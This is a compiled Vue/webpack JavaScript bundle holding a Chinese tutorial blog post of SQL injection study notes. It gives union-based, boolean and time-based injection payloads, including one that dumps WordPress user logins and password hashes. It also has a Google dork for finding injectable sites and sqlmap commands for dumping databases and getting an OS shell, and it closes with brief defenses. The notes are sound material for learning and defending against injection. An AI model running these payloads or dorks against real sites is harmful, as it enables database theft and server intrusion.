(window.webpackJsonp=window.webpackJsonp||[]).push([[156],{1199:function(e,t){const r={render:function(){var e=this;e.$createElement;return e._self._c,e._m(0)},staticRenderFns:[function(){var e=this,t=e.$createElement,r=e._self._c||t;return r("div",{staticClass:"frontmatter-markdown"},[r("h2",{attrs:{id:"前言"}},[e._v("前言")]),e._v(" "),r("p",[e._v("本文是观看"),r("a",{attrs:{href:"https://www.bilibili.com/video/BV1g4411Y7Y4/"}},[e._v("此视频")]),e._v("时的笔记")]),e._v(" "),r("h2",{attrs:{id:"原理"}},[e._v("原理")]),e._v(" "),r("h3",{attrs:{id:"基本思路"}},[e._v("基本思路")]),e._v(" "),r("p",[e._v("如果服务器使用字符串拼接的方法处理 SQL 查询，就可以实现 SQL 注入。")]),e._v(" "),r("p",[e._v("比如说，服务器使用"),r("code",{pre:!0},[e._v("\"SELECT * FROM users WHERE id='$id'\"")]),e._v("，我们可以令"),r("code",{pre:!0},[e._v("id")]),e._v("为"),r("code",{pre:!0},[e._v("' or 1=1 --")]),e._v("，使 SQL 语句变为：")]),e._v(" "),r("pre",{staticClass:"language-sql"},[r("code",{pre:!0,attrs:{class:"language-sql"}},[r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("SELECT")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("*")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("FROM")]),e._v(" users "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("WHERE")]),e._v(" id"),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("''")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("or")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("1")]),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("1")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token comment"}},[e._v("--'")]),e._v("\n")])]),e._v(" "),r("p",[e._v("其中"),r("code",{pre:!0},[e._v("'")]),e._v("用来闭合字符串中的引号，"),r("code",{pre:!0},[e._v("or 1=1")]),e._v("用来确保"),r("code",{pre:!0},[e._v("where")]),e._v("的结果一定为真，"),r("code",{pre:!0},[e._v("--")]),e._v("确保后面的字符串都是注释而被忽略")]),e._v(" "),r("p",[e._v("这样我们就可以获取所有用户的信息")]),e._v(" "),r("p",[e._v("如果我们在注入的变量里面使用"),r("code",{pre:!0},[e._v("join")]),e._v("/"),r("code",{pre:!0},[e._v("union")]),e._v("，就可以获得其他表的信息。可能需要一些字面值进行字段填充")]),e._v(" "),r("h3",{attrs:{id:"常用-sql-命令"}},[e._v("常用 SQL 命令")]),e._v(" "),r("ul",[r("li",[r("code",{pre:!0},[e._v("show database")]),e._v("查看数据库")]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("show tables")]),e._v("查看表")]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("desc <table>")]),e._v("查看表详情\n"),r("ul",[r("li",[r("code",{pre:!0},[e._v("desc mysql.user")])]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("desc wordpress.wp_users")])])])]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("show create table <table>")]),e._v("查看建表语句")]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("select * from books where id = '' and 1=2 union select user_login, user_pass, '1', '2' from wordpress.wp_users")]),e._v(" "),r("ul",[r("li",[e._v("使用"),r("code",{pre:!0},[e._v("and 1=2")]),e._v("使原本的 SQL 查询不返回任何结果，然后"),r("code",{pre:!0},[e._v("union")]),e._v("右边的 SQL 查询，实现仅返回右边的结果")]),e._v(" "),r("li",[e._v("使用字面值"),r("code",{pre:!0},[e._v("'1', '2'")]),e._v("填充字段")])])]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("select * from information_schema.tables")]),e._v("查询表结构\n"),r("ul",[r("li",[e._v("因为联合查询中不能使用"),r("code",{pre:!0},[e._v("show database")]),e._v("/"),r("code",{pre:!0},[e._v("show tables")]),e._v("，所以需要通过"),r("code",{pre:!0},[e._v("information_schema")]),e._v("库来查表信息")]),e._v(" "),r("li",[e._v("也可以"),r("code",{pre:!0},[e._v("select database()")]),e._v("查看数据库信息")])])]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("select database()")]),e._v("/"),r("code",{pre:!0},[e._v("select version()")]),e._v("/"),r("code",{pre:!0},[e._v("select user()")]),e._v("查询所有数据库名/数据库版本信息/当前用户名")])]),e._v(" "),r("h3",{attrs:{id:"字段填充"}},[e._v("字段填充")]),e._v(" "),r("p",[e._v("如果要猜测原本 SQL 语句中的字段数量，可能需要使用如下 SQL 语句：")]),e._v(" "),r("pre",{staticClass:"language-sql"},[r("code",{pre:!0,attrs:{class:"language-sql"}},[r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("select")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("*")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("from")]),e._v(" xxx "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("union")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("select")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("1")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v("\n"),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("select")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("*")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("from")]),e._v(" xxx "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("union")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("select")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("1")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("2")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v("\n"),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("select")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("*")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("from")]),e._v(" xxx "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("union")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("select")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("1")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("2")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("3")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v("\n"),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("select")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("*")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("from")]),e._v(" xxx "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("union")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("select")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("1")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("2")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("3")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("4")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v("\n"),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("select")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("*")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("from")]),e._v(" xxx "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("union")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("select")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("1")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("2")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("3")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("4")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("5")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v("\n"),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("select")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("*")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("from")]),e._v(" xxx "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("union")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("select")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("1")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("2")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("3")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("4")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("5")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("6")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v("\n"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(".")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(".")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(".")]),e._v("\n")])]),e._v(" "),r("p",[e._v("查到字段数量之后，实际查询中就可以使用字段填充来增加字段数量，或者字段拼接减少字段数量：")]),e._v(" "),r("pre",{staticClass:"language-sql"},[r("code",{pre:!0,attrs:{class:"language-sql"}},[r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("select")]),e._v(" a"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("1")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token number"}},[e._v("2")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("from")]),e._v(" xxx"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v("\n"),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("select")]),e._v(" a"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" b"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" concat"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("(")]),e._v("c"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("'.'")]),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(",")]),e._v(" d"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(")")]),e._v(" "),r("span",{pre:!0,attrs:{class:"token keyword"}},[e._v("from")]),e._v(" xxx"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(";")]),e._v("\n")])]),e._v(" "),r("h3",{attrs:{id:"注入方式"}},[e._v("注入方式")]),e._v(" "),r("ul",[r("li",[e._v("基于错误的注入\n"),r("ul",[r("li",[e._v("如果输入错误的 SQL 语句，服务器报错，说明服务器进行的是 SQL 拼接，而不是参数化查询，存在注入点")]),e._v(" "),r("li",[e._v("所以基于错误的注入，主要用来探测注入点")])])]),e._v(" "),r("li",[e._v("基于布尔注入\n"),r("ul",[r("li",[e._v("发现注入点后，使用"),r("code",{pre:!0},[e._v("' or 1=1 --")]),e._v("的方式，使原本的布尔逻辑失效")]),e._v(" "),r("li",[e._v("然后使用字段填充，查到原本 SQL 语句的字段数量")])])]),e._v(" "),r("li",[e._v("基于 Union 注入\n"),r("ul",[r("li",[e._v("通过 union 来查询其他表的内容")])])]),e._v(" "),r("li",[e._v("基于时间盲注\n"),r("ul",[r("li",[e._v("盲注的意思是服务器并不返回 SQL 查询结果")]),e._v(" "),r("li",[e._v("使用时间函数"),r("code",{pre:!0},[e._v("sleep(5)")]),e._v("。如果服务器等待了 5 秒，则说明存在注入点")]),e._v(" "),r("li",[e._v("示例："),r("code",{pre:!0},[e._v("select * from xxx where id = '1' and sleep(5) --'")]),e._v(" "),r("ul",[r("li",[e._v("注意：使用"),r("code",{pre:!0},[e._v("and")]),e._v("的时候，"),r("code",{pre:!0},[e._v("and")]),e._v("前面的条件需要为 true，才会触发 sleep")])])])])])]),e._v(" "),r("h3",{attrs:{id:"sqlmap"}},[e._v("sqlmap")]),e._v(" "),r("p",[e._v("自动化注入工具")]),e._v(" "),r("ul",[r("li",[r("code",{pre:!0},[e._v("sqlmap -h")]),e._v("查看帮助\n"),r("ul",[r("li",[r("code",{pre:!0},[e._v("sqlmap -hh")]),e._v("查看高级帮助")])])]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("-u")]),e._v("指定需要注入的 URL\n"),r("ul",[r("li",[e._v("使用谷歌搜索"),r("code",{pre:!0},[e._v("inurl:.php?id=")]),e._v("可以查询带有疑似 SQL 注入点的网站")])])]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("-g")]),e._v("使用谷歌帮忙搜索注入点")]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("-c")]),e._v("通过配置文件指定注入点")]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("--method")]),e._v("指定 HTTP 方法")]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("--random-agent")]),e._v("随机"),r("code",{pre:!0},[e._v("User-Agent")])]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("--dbms")]),e._v("手动指定数据库类型")]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("--batch")]),e._v("自动回答"),r("code",{pre:!0},[e._v("Y")])]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("-p")]),e._v("指定 SQL 注入的参数，逗号隔开\n"),r("ul",[r("li",[r("code",{pre:!0},[e._v("--skip")]),e._v("指定跳过的参数，逗号隔开")])])]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("--cookie")]),e._v("指定 Cookie")]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("--sql-shell")]),e._v("获得 SQL SHELL，但是并不是所有 SQL 命令都可以被执行\n"),r("ul",[r("li",[r("code",{pre:!0},[e._v("--sql-query")]),e._v("指定 SQL 语句查询")])])]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("--os-shell")]),e._v("尝试获取操作系统 SHELL，可能会失败")]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("--os-cmd")]),e._v("使用操作系统命令")]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("-o")]),e._v("一键优化，相当于如下三个优化\n"),r("ul",[r("li",[r("code",{pre:!0},[e._v("--keep-alive")]),e._v("使用持久连接")]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("--null-connection")]),e._v("不接受 HTTP Body，常用于盲注")]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("--thread")]),e._v("指定线程数量")])])]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("--hex")]),e._v("使用 16 进制传输信息。不会影响最终的结果输出，但是效率可能更高")]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("--fresh-queries")]),e._v("忽略缓存")]),e._v(" "),r("li",[r("code",{pre:!0},[e._v("--count")]),e._v("查询表的行数")])]),e._v(" "),r("p",[e._v("其他注意事项：")]),e._v(" "),r("ul",[r("li",[e._v("sqlmap 注入成功之后会把连接信息缓存在本地，执行其他命令的时候就可以直接调用了。毕竟每次尝试注入可能会花十几分钟")]),e._v(" "),r("li",[e._v("sqlmap 还会自带一些哈希字典，可以把常见的哈希密码还原为明文，且支持自定义字典")]),e._v(" "),r("li",[e._v("有些站点需要登录，所以发请求的时候要带上 Cookie，否则会被重定向")])]),e._v(" "),r("p",[e._v("示例：")]),e._v(" "),r("pre",{staticClass:"language-bash"},[r("code",{pre:!0,attrs:{class:"language-bash"}},[r("span",{pre:!0,attrs:{class:"token comment"}},[e._v("# 首次尝试注入")]),e._v("\nsqlmap -u "),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("'https://xxx.com/index.php?id=123'")]),e._v(" --batch --dbms"),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v("mysql -p username\n\n"),r("span",{pre:!0,attrs:{class:"token comment"}},[e._v("# 如果成功，就可以使用其他参数获取信息了")]),e._v("\n"),r("span",{pre:!0,attrs:{class:"token comment"}},[e._v("# 比如使用`--dbs`获得所有数据库的信息")]),e._v("\nsqlmap -u "),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("'https://xxx.com/index.php?id=123'")]),e._v(" --batch --dbms"),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v("mysql -p username --dbs\nsqlmap -u "),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("'https://xxx.com/index.php?id=123'")]),e._v(" --batch --dbms"),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v("mysql -p username --users\nsqlmap -u "),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("'https://xxx.com/index.php?id=123'")]),e._v(" --batch --dbms"),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v("mysql -p username --current-user\nsqlmap -u "),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("'https://xxx.com/index.php?id=123'")]),e._v(" --batch --dbms"),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v("mysql -p username --current-db\nsqlmap -u "),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("'https://xxx.com/index.php?id=123'")]),e._v(" --batch --dbms"),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v("mysql -p username -D "),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("'database'")]),e._v(" --tables\nsqlmap -u "),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("'https://xxx.com/index.php?id=123'")]),e._v(" --batch --dbms"),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v("mysql -p username -D "),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("'database'")]),e._v(" -T "),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("'table'")]),e._v(" --columns\nsqlmap -u "),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("'https://xxx.com/index.php?id=123'")]),e._v(" --batch --dbms"),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v("mysql -p username -D "),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("'database'")]),e._v(" -T "),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("'table'")]),e._v(" --dump\nsqlmap -u "),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("'https://xxx.com/index.php?id=123'")]),e._v(" --batch --dbms"),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v("mysql -p username -D "),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("'database'")]),e._v(" -T "),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("'table'")]),e._v(" -C "),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("'username, password'")]),e._v(" --dump\nsqlmap -u "),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("'https://xxx.com/index.php?id=123'")]),e._v(" --batch --dbms"),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v("mysql -p username --dump-all\nsqlmap -u "),r("span",{pre:!0,attrs:{class:"token string"}},[e._v("'https://xxx.com/index.php?id=123'")]),e._v(" --batch --dbms"),r("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),e._v("mysql -p username --dump-all --exclude-sysdbs\n")])]),e._v(" "),r("h2",{attrs:{id:"流程"}},[e._v("流程")]),e._v(" "),r("ol",[r("li",[e._v("判断是否有 SQL 注入漏洞（注入点）")]),e._v(" "),r("li",[e._v("判断操作系统、数据库、WEB 服务器的信息")]),e._v(" "),r("li",[e._v("获取数据库信息，包括管理员信息和拖库")]),e._v(" "),r("li",[e._v("加密信息破解")]),e._v(" "),r("li",[e._v("提权，获得 sql-shell、os-shell，登录服务器")])]),e._v(" "),r("h2",{attrs:{id:"防御"}},[e._v("防御")]),e._v(" "),r("ul",[r("li",[e._v("给数据库用户设置最小权限，防止用户查系统表/权限之外的表")]),e._v(" "),r("li",[e._v("使用参数化查询，避免字符串拼接")])])])}]};e.exports={attributes:{title:"Security-4",description:"SQL注入"},vue:{render:r.render,staticRenderFns:r.staticRenderFns,component:{data:function(){return{templateRender:null}},render:function(e){return this.templateRender?this.templateRender():e("div","Rendering")},created:function(){this.templateRender=r.render,this.$options.staticRenderFns=r.staticRenderFns}}}}}}]);